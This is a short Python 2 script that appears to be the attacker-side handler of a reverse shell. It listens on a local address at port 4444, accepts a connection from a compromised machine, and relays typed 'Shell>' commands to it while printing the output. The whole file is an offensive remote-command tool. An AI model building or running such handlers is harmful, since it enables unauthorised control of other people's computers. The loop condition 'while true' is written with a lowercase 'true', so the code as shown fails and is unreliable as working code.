import socket

def connect():

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.bind(("192.168.80.38" , 4444))
    sk.listen(1)
    conct , address = sk.accept()
    print("We got a new connection from: ", address)

    while true:

        command = raw_input("Shell>")
        if "terminate" in command:
            conct.send("terminate")
            conct.close()
            print("Connection Closed...!!!")
            break

        else:
            conct.send(command)
            print(conct.recv(1024))

def main():
    connect()
main()
